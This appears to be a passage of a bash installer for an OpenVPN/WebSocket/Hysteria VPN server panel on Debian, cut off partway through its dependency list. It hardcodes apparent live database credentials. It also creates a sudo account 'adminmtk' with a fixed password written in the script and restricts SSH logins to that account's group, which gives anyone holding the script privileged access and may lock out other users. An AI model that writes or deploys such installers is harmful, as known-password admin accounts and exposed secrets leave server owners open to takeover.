#!/bin/bash

# ============================================================
# Debian OpenVPN + WS + Hysteria Installer
# ============================================================

set -u

export DEBIAN_FRONTEND=noninteractive
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# ============================================================
# DATABASE CONFIGURATION
# ============================================================

DB_HOST="localhost"
DB_USER="premfayw_sigmaadmin"
DB_PASS="Sksamiul@775"
DB_NAME="premfayw_sigma_panel"

# ============================================================
# SERVER PORTS
# ============================================================

PORT_TCP="1194"
PORT_UDP="1195"
PORT_SSL="443"

HYSTERIA_PORT="5666"
SOCKS_PORT="80"
SQUID_PORT="8080"

OBFS="mediatekvpn"

LOG_FILE="/var/log/debian_ovpnws_install.log"

# ============================================================
# LOGGING
# ============================================================

mkdir -p "$(dirname "$LOG_FILE")"

exec > >(tee -a "$LOG_FILE") 2>&1

log() {
    echo
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

fail_install() {
    log "=========================================="
    log "INSTALLATION FAILED"
    log "$1"
    log "Check log: $LOG_FILE"
    log "=========================================="
    exit 1
}

# ============================================================
# SERVER INFORMATION
# ============================================================

timedatectl set-timezone Asia/Riyadh 2>/dev/null || true

server_ip="$(curl -4 -s --max-time 10 https://api.ipify.org || true)"

if [ -z "$server_ip" ]; then
    fail_install "Could not determine public IP."
fi

server_interface="$(
    ip route get 8.8.8.8 2>/dev/null |
    awk '/dev/ {
        for (i=1;i<=NF;i++)
            if ($i=="dev") {
                print $(i+1)
                exit
            }
    }'
)"

[ -z "$server_interface" ] && server_interface="eth0"

log "=========================================="
log "Debian OpenVPN/WS installer"
log "Server IP       : $server_ip"
log "Interface       : $server_interface"
log "DB Host         : $DB_HOST"
log "DB User         : $DB_USER"
log "DB Name         : $DB_NAME"
log "TCP Port        : $PORT_TCP"
log "UDP Port        : $PORT_UDP"
log "SSL Port        : $PORT_SSL"
log "Hysteria Port   : $HYSTERIA_PORT"
log "=========================================="

# ============================================================
# ROOT CHECK
# ============================================================

if [ "$(id -u)" -ne 0 ]; then
    fail_install "Run this installer as root."
fi

# ============================================================
# ADMIN USER / SSH
# ============================================================

install_sudo() {

    log "Configuring admin user..."

    if ! id adminmtk >/dev/null 2>&1; then
        useradd -m adminmtk || true
    fi

    echo 'adminmtk:Mediatek272124@@' | chpasswd \
        || fail_install "Unable to configure adminmtk."

    usermod -aG sudo adminmtk || true

    if [ -f /etc/ssh/sshd_config ]; then

        sed -i \
            's/^PermitRootLogin yes/PermitRootLogin no/g' \
            /etc/ssh/sshd_config

        if ! grep -q '^AllowGroups adminmtk' /etc/ssh/sshd_config; then
            echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
        fi

    fi

    systemctl restart ssh 2>/dev/null ||
    systemctl restart sshd 2>/dev/null ||
    true
}

# ============================================================
# DEPENDENCIES
# ============================================================

install_require() {

    log "Installing dependencies..."

    apt-get update ||
        fail_install "apt update failed."

    apt-get install -y \
        curl \
        wget \
        cron \
        python3-minimal \
        libpython3-stdlib \
        iptables \
        iptables-persistent \
        openvpn \
        netcat-openbsd \
        httpie \
        php \
        vnstat \
        screen \
        squid \
        stunnel4 \
        dropbear \
        gnutls-bin \
        dos2unix \
        nano \
        unzip \
        jq \
        virt-what \
        net-tools \
        default-mysql-client \
        mlocate \
        dh-make \
        libaudit-dev \
        build-essential \
        fail2ban \
        libssl-dev \
        zlib1g-dev \
        libncurses5-dev \
        libgdbm-dev \
        libnss3-dev \
        libreadline-dev \
        libffi-dev \
        openssl \
        ca-certificates \
        sudo \
        tar \
        systemd \
        dbus \
        socat \
        git \
        lsb-release \
        debian-archive-keyring \
        grub2-common \
        linux-image-amd64 \
